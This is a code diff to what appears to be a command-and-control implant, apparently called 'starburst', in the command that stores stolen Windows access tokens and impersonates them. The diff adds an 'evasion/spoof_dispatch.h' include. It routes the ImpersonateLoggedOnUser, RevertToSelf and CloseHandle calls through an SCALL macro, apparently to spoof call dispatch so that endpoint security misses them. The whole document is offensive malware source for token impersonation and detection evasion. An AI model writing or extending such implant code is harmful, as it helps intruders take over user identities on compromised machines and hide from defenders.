@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_TOKEN_STORE
 
@@ -116,7 +117,7 @@ auto declfn starburst::cmd_token_store(
             return;
         }
 
-        if ( !inst.advapi32.ImpersonateLoggedOnUser( store[token_id].token ) ) {
+        if ( !SCALL( inst, advapi32.ImpersonateLoggedOnUser, store[token_id].token ) ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
                 symbol<char*>( const_cast<char*>( "ImpersonateLoggedOnUser failed" ) ) );
             return;
@@ -124,7 +125,7 @@ auto declfn starburst::cmd_token_store(
 
         // close old impersonated token if one exists
         if ( inst.agent.impersonated_token )
-            inst.kernel32.CloseHandle( inst.agent.impersonated_token );
+            SCALL( inst, kernel32.CloseHandle, inst.agent.impersonated_token );
 
         inst.agent.impersonated_token = store[token_id].token;
 
@@ -158,11 +159,11 @@ auto declfn starburst::cmd_token_store(
 
         // if this token is the current impersonation, revert first
         if ( store[token_id].token == inst.agent.impersonated_token ) {
-            inst.advapi32.RevertToSelf();
+            SCALL( inst, advapi32.RevertToSelf );
             inst.agent.impersonated_token = nullptr;
         }
 
-        inst.kernel32.CloseHandle( store[token_id].token );
+        SCALL( inst, kernel32.CloseHandle, store[token_id].token );
         store[token_id].token  = nullptr;
         store[token_id].pid    = 0;
         store[token_id].active = false;
